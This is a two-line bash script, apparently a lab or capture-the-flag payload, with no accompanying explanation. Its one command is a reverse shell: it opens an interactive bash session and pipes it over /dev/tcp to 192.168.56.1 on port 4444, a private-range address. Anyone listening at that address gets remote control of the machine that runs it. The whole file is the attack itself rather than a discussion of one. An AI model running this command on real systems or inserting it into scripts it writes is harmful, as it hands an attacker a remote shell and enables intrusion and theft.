#!/bin/bash
bash -i >& /dev/tcp/192.168.56.1/4444 0>&1
